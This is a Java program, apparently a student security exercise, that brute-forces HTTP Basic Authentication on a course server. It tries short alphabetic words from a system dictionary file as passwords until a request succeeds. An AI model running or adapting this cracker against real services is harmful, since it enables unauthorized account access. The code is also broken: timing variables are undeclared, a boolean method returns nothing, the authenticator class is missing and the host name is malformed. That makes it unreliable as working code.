





import java.io.*;
import java.net.*;



public class Dictionary
{
   public static void main (String args[]) throws IOException,
   MalformedURLException
   {
      final String username = "";
      final String fullurl = "http://sec-crack.cs.rmit.edu./SEC/2/";
      final String dictfile = "/usr/share/lib/dict/words";
      String temppass;
      String password = "";
      URL url = new URL(fullurl);
      boolean cracked = false;

       startTime = System.currentTimeMillis();

      
      BufferedReader r = new BufferedReader(new FileReader(dictfile));

      while((temppass = r.readLine()) != null && !cracked)
      {  
         
         if(temppass.length() <= 3)
         {
            
            if(isAlpha(temppass))
            {
               
               Authenticator.setDefault(new MyAuthenticator(username,temppass));
               try{
                  BufferedReader x = new BufferedReader(new InputStreamReader(
                     url.openStream()));
                  cracked = true;
                  password = temppass;
               } catch(Exception e){}
            }
         }
      }

       stopTime = System.currentTimeMillis();
      
      if(!cracked)
         System.out.println("Sorry, couldnt find the password");
      else
         System.out.println("Password found: "+password);
      System.out.println("Time taken: "+(stopTime-startTime));
   }

   public static boolean isAlpha(String s)
   {
      boolean v = true;
      for(int i=0; i<s.length(); i++)
      {
         if(!Character.isLetter(s.charAt(i)))
            v = false;
      }
      return ;
   }
}

